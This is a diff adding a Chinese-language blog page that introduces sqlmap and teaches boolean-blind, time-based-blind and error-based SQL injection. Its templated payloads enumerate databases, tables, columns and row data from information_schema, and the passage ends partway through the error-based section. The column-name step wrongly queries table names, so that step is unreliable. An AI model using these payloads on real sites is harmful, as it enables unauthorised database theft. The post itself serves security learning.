@@ -1,0 +1,1204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="简介 sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。 具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。 支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Ac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Home">
+<meta property="og:url" content="http://example.com/2022/05/17/man_sqlmap/index.html">
+<meta property="og:site_name" content="CheUhxg&#39;s Blog">
+<meta property="og:description" content="简介 sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。 具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。 支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Ac">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207174443309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207174509634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207174531823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2022-05-17T09:02:40.000Z">
+<meta property="article:modified_time" content="2022-05-17T10:57:01.626Z">
+<meta property="article:author" content="CheUhxg">
+<meta property="article:tag" content="SDN | Container | C&#x2F;C++ | Go | Distributed">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210207174443309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70">
+
+<link rel="canonical" href="http://example.com/2022/05/17/man_sqlmap/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Home | CheUhxg's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="CheUhxg's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CheUhxg's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Code Copyer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tools/" rel="section"><i class="tools vulns exps notes fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/man_sqlmap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="CheUhxg">
+      <meta itemprop="description" content="C0py for Coding">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CheUhxg's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Home
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-05-17 17:02:40 / Modified: 18:57:01" itemprop="dateCreated datePublished" datetime="2022-05-17T17:02:40+08:00">2022-05-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul>
+<li><code>sqlmap</code>是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。</li>
+<li>具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</li>
+<li>支持<code>MySQL</code>, <code>Oracle</code>,<code>PostgreSQL</code>, <code>Microsoft SQL Server</code>, <code>Microsoft Access</code>, <code>IBM DB2</code>,<code>SQLite</code>,<code>Firebird</code>,<code>Sybase</code>和<code>SAP MaxDB</code>等数据库的各种安全漏洞检测。</li>
+</ul>
+<h1 id="注入模式"><a href="#注入模式" class="headerlink" title="注入模式"></a>注入模式</h1><h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><ul>
+<li>没有显示位置，只显示页面返回是否正常。</li>
+<li>即可以根据返回页面，判断条件真假的注入。</li>
+</ul>
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-exists.html">EXISTS</a> (string <code>subquery</code>)运算符，判断查询子句<code>subquery</code>在数据库中是否有记录。</li>
+<li><a target="_blank" rel="noopener" href="http://www.hechaku.com/sqlfunction/SQL_ASCII_str_hanshu.html">ASCII</a> (string <code>str</code>) 函数，返回字符串<code>str</code>第一个字符的<code>ascii</code>码；若返回<code>0</code>，则为空字符串。</li>
+<li><a target="_blank" rel="noopener" href="https://www.begtut.com/sql/func-mysql-substr.html">SUBSTR</a> (string <code>str</code>, num <code>start</code>, num <code>length</code>)函数，划分出第<code>start</code>位开始，长度为<code>length</code>的子串。</li>
+</ul>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
+<li>寻找注入点，判断注入类型。</li>
+<li>判断数据库。</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#判断数据库个数</span><br><span class="line">#n为猜测的数据库个数</span><br><span class="line">... <span class="keyword">AND</span> ((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span><span class="operator">+</span>table_schema)<span class="keyword">FROM</span> information_schema.tables)<span class="operator">&gt;</span>n);</span><br><span class="line"></span><br><span class="line">#当前数据库名称</span><br><span class="line">#c为猜测的ASCII码值，y为名称字符串偏移量</span><br><span class="line">... <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ascii(substr((<span class="keyword">SELECT</span> database()),y,<span class="number">1</span>))<span class="operator">&gt;</span>c);</span><br><span class="line"></span><br><span class="line">#所有数据库名称</span><br><span class="line">#x为数据库偏移量，c为猜测的ASCII码值，y为库名偏移量</span><br><span class="line">... <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ASCII(SUBSTR((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> table_schema <span class="keyword">FROM</span> information_schema.tables LIMIT x,<span class="number">1</span>),y,<span class="number">1</span>))<span class="operator">&gt;</span>c);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_distinct.asp">DISTINCT</a> ()语句，在大量返回语句中去重。</p>
+<p><code>table_schema</code>指代数据库名称，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/champaign/p/12389793.html">information_schema.tables</a>包含了所有有关数据库的信息。</p>
+</blockquote>
+<ol>
+<li>判断数据表。</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#判断指定库中表的个数</span><br><span class="line">#n为猜测的数据表个数，base_h为指定库的hex编码</span><br><span class="line">... <span class="keyword">AND</span> ((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span><span class="operator">+</span>table_name)<span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span> base_h)<span class="operator">&gt;</span>n);</span><br><span class="line"></span><br><span class="line">#判断表名长度</span><br><span class="line">#x为数据表偏移量，l为猜测表名长度，base_h为指定库的hex编码</span><br><span class="line">... <span class="keyword">AND</span> (LENGTH((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>base_h LIMIT x,<span class="number">1</span>))<span class="operator">&gt;</span>l);</span><br><span class="line"></span><br><span class="line">#判断表名字符</span><br><span class="line">#x为数据表偏移量，y为名称字符串偏移量，c为猜测的ASCII码值，base_h为指定库的hex编码</span><br><span class="line">... <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ASCII(SUBSTR((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>base_h LIMIT x,<span class="number">1</span>),y,<span class="number">1</span>))<span class="operator">&gt;</span>c);</span><br></pre></td></tr></table></figure>
+<ol>
+<li>判断列。</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#判断指定表中列的个数</span><br><span class="line">#n为猜测的列的个数，base_h为指定库的hex编码，table_h为指定表的hex编码</span><br><span class="line">... <span class="keyword">AND</span> ((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span><span class="operator">+</span>column_name)<span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span>table_h <span class="keyword">AND</span> table_schema<span class="operator">=</span> base_h)<span class="operator">&gt;</span>n);</span><br><span class="line"></span><br><span class="line">#判断列名长度</span><br><span class="line">#x为列偏移量，l为猜测列名长度，base_h为指定库的hex编码，table_h为指定表的hex编码</span><br><span class="line">... <span class="keyword">AND</span> (LENGTH((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span>table_h <span class="keyword">AND</span> table_schema<span class="operator">=</span>base_h LIMIT x,<span class="number">1</span>))<span class="operator">&gt;</span>l);</span><br><span class="line"></span><br><span class="line">#判断列名字符</span><br><span class="line">#x为列偏移量，y为名称字符串偏移量，c为猜测的ASCII码值，base_h为指定库的hex编码，table_h为指定表的hex编码</span><br><span class="line">... <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ASCII(SUBSTR((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_name<span class="operator">=</span>table_h <span class="keyword">AND</span> table_schema<span class="operator">=</span>base_h LIMIT x,<span class="number">1</span>),y,<span class="number">1</span>))<span class="operator">&gt;</span>c);</span><br></pre></td></tr></table></figure>
+<ol>
+<li>判断数据。</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#判断数据表中数据个数</span><br><span class="line">#n为猜测的数据个数，base_n为数据库名，table_n为数据表名</span><br><span class="line">... <span class="keyword">AND</span> ((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> base_n.table_n)<span class="operator">&gt;</span>n);</span><br><span class="line"></span><br><span class="line">#判断字段长度</span><br><span class="line">#x为字段偏移量，l为猜测字段长度，base_n为数据库名，table_n为数据表名，column_n为列名</span><br><span class="line">... <span class="keyword">AND</span> (LENGTH((<span class="keyword">SELECT</span> column_n <span class="keyword">FROM</span> base_n.table_n LIMIT x,<span class="number">1</span>))<span class="operator">&gt;</span>l);</span><br><span class="line"></span><br><span class="line">#判断字段字符</span><br><span class="line">#x为字段偏移量，y为名称字符串偏移量，c为猜测的ASCII码值，base_n为数据库名，table_n为数据表名，column_n为列名</span><br><span class="line">... <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ASCII(SUBSTR((<span class="keyword">SELECT</span> column_n <span class="keyword">FROM</span> base_n.table_n LIMIT x,<span class="number">1</span>),y,<span class="number">1</span>))<span class="operator">&gt;</span>c);</span><br></pre></td></tr></table></figure>
+<h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><ul>
+<li>没有数据输出点，仍有响应返回。</li>
+<li>返回的响应可以判断是否注入成功，但不显示<code>sql</code>查询情况。</li>
+</ul>
+<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><ul>
+<li>是一种盲注的手法，提交对执行时间敏感的<code>sql</code>语句函数，通过执行时间的长短来判断是否执行成功。</li>
+<li>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
+<li>通常来说，时间变长说明执行成功，时间很短说明注入失败。</li>
+</ul>
+<h3 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h3><ul>
+<li><code>SLEEP</code> ( int <code>n</code> )执行后，延迟<code>n</code>秒。</li>
+<li><a target="_blank" rel="noopener" href="https://www.begtut.com/sql/func-mysql-if.html">IF</a> ( <code>CONDITION</code>, <code>TRUE</code>, <code>FALSE</code>) 如果条件语句<code>CONDITION</code>为真，执行<code>TRUE</code>语句；反之，执行<code>FALSE</code>语句。</li>
+</ul>
+<h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ol>
+<li>寻找注入点，判断注入类型。</li>
+<li>判断数据库。</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#判断数据库个数</span><br><span class="line">#n为猜测的数据库个数</span><br><span class="line">... <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span><span class="operator">+</span>table_schema)<span class="keyword">FROM</span> information_schema.tables)<span class="operator">&gt;</span>n,SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">#当前数据库名称</span><br><span class="line">#c为猜测的ASCII码值，y为名称字符串偏移量</span><br><span class="line">... <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> ASCII(substr((<span class="keyword">SELECT</span> database()),y,<span class="number">1</span>))<span class="operator">&gt;</span>c),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">#所有数据库名称</span><br><span class="line">#x为数据库偏移量，c为猜测的ASCII码值，y为库名偏移量</span><br><span class="line">... <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> ASCII(SUBSTR((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> table_schema <span class="keyword">FROM</span> information_schema.tables LIMIT x,<span class="number">1</span>),y,<span class="number">1</span>))<span class="operator">&gt;</span>c),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<ol>
+<li>判断数据表。</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#判断指定库中表的个数</span><br><span class="line">#n为猜测的数据表个数，base_h为指定库的hex编码</span><br><span class="line">... <span class="keyword">AND</span> IF(((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span><span class="operator">+</span>table_name)<span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span> base_h)<span class="operator">&gt;</span>n),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">#判断表名长度</span><br><span class="line">#x为数据表偏移量，l为猜测表名长度，base_h为指定库的hex编码</span><br><span class="line">... <span class="keyword">AND</span> IF((LENGTH((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>base_h LIMIT x,<span class="number">1</span>))<span class="operator">&gt;</span>l),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">#判断表名字符</span><br><span class="line">#x为数据表偏移量，y为名称字符串偏移量，c为猜测的ASCII码值，base_h为指定库的hex编码</span><br><span class="line">... <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> ASCII(SUBSTR((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>base_h LIMIT x,<span class="number">1</span>),y,<span class="number">1</span>))<span class="operator">&gt;</span>c),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<ol>
+<li>判断列。</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#判断指定表中列的个数</span><br><span class="line">#n为猜测的列的个数，base_h为指定库的hex编码，table_h为指定表的hex编码</span><br><span class="line">... <span class="keyword">AND</span> IF(((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span><span class="operator">+</span>column_name)<span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span>table_h <span class="keyword">AND</span> table_schema<span class="operator">=</span> base_h)<span class="operator">&gt;</span>n),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">#判断列名长度</span><br><span class="line">#x为列偏移量，l为猜测列名长度，base_h为指定库的hex编码，table_h为指定表的hex编码</span><br><span class="line">... <span class="keyword">AND</span> IF((LENGTH((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span>table_h <span class="keyword">AND</span> table_schema<span class="operator">=</span>base_h LIMIT x,<span class="number">1</span>))<span class="operator">&gt;</span>l),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">#判断列名字符</span><br><span class="line">#x为列偏移量，y为名称字符串偏移量，c为猜测的ASCII码值，base_h为指定库的hex编码，table_h为指定表的hex编码</span><br><span class="line">... <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> ASCII(SUBSTR((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_name<span class="operator">=</span>table_h <span class="keyword">AND</span> table_schema<span class="operator">=</span>base_h LIMIT x,<span class="number">1</span>),y,<span class="number">1</span>))<span class="operator">&gt;</span>c),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<ol>
+<li>判断数据。</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#判断数据表中数据个数</span><br><span class="line">#n为猜测的数据个数，base_n为数据库名，table_n为数据表名</span><br><span class="line">... <span class="keyword">AND</span> IF(((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> base_n.table_n)<span class="operator">&gt;</span>n),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">#判断字段长度</span><br><span class="line">#x为字段偏移量，l为猜测字段长度，base_n为数据库名，table_n为数据表名，column_n为列名</span><br><span class="line">... <span class="keyword">AND</span> IF((LENGTH((<span class="keyword">SELECT</span> column_n <span class="keyword">FROM</span> base_n.table_n LIMIT x,<span class="number">1</span>))<span class="operator">&gt;</span>l),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">#判断字段字符</span><br><span class="line">#x为字段偏移量，y为名称字符串偏移量，c为猜测的ASCII码值，base_n为数据库名，table_n为数据表名，column_n为列名</span><br><span class="line">... <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> ASCII(SUBSTR((<span class="keyword">SELECT</span> column_n <span class="keyword">FROM</span> base_n.table_n LIMIT x,<span class="number">1</span>),y,<span class="number">1</span>))<span class="operator">&gt;</span>c),SLEEP(<span class="number">5</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h3><ul>
+<li>没有数据输出点。</li>
+<li>可以明显观察到页面返回时间。</li>
+</ul>
+<h2 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h2><ul>
+<li>人为制造数据库报错，通过返回的错误信息，得到数据库相关信息。</li>
+<li>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>
+</ul>
+<h3 id="常用函数-2"><a href="#常用函数-2" class="headerlink" title="常用函数"></a>常用函数</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.begtut.com/sql/func-mysql-concat.html">CONCAT</a> ( string <code>str1</code>, string <code>str2</code>, … ) 将若干个字符串拼接。</li>
+<li><a target="_blank" rel="noopener" href="https://www.begtut.com/sql/func-mysql-rand.html#">RAND</a> (int <code>seed</code>)当种子为空时，返回一个<code>0</code>到<code>1</code>的随机小数。</li>
+<li><a target="_blank" rel="noopener" href="https://www.begtut.com/sql/func-mysql-floor.html#">FLOOR</a> (int <code>number</code>)返回小于或者等于数字<code>num</code>的最大整数值(向下取整)。</li>
+<li><a target="_blank" rel="noopener" href="https://www.begtut.com/mysql/mysql-group-by.html">GROUP BY</a>  int <code>key1</code>, <code>key2</code>, …将查询结果按照关键词<code>key</code>依次分组(去重)。</li>
+<li><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml">UpdateXML</a> (string <code>XML_target</code>, string <code>Xpath_expr</code>, string <code>new_XML</code>) <code>XML_target</code>为<code>XML</code>文档对象的名称，<code>Xpath_expr</code>为<code>Xpath</code>格式的表达式，<code>new_XML</code>用来替换匹配到的数据。即在<code>XML_target</code>中匹配符合<code>Xpath_expr</code>的数据，替换为<code>new_XML</code>。</li>
+<li><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue">ExtractValue</a> (string <code>XML_frag</code>, string <code>Xpath_expr</code>)第一个参数可以传入目标<code>xml</code>文档，第二个参数是用<code>Xpath</code>路径法表示的查找路径。</li>
+</ul>
+<h3 id="报错方法"><a href="#报错方法" class="headerlink" title="报错方法"></a>报错方法</h3><h4 id="FLOOR-RAND-GROUP-BY"><a href="#FLOOR-RAND-GROUP-BY" class="headerlink" title="FLOOR+RAND+GROUP BY"></a>FLOOR+RAND+GROUP BY</h4><ul>
+<li><code>FLOOR()</code>和<code>RAND()</code>联合产生<code>01</code>序列组，<code>GROUP BY</code>在分组时会建立一个虚拟表，将数据依次加载到虚拟表中(首次出现则创建，否则累加)。</li>
+<li><p><img src="https://img-blog.csdnimg.cn/20210207174443309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" alt=""></p>
+</li>
+<li><p><img src="https://img-blog.csdnimg.cn/20210207174509634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" alt=""></p>
+</li>
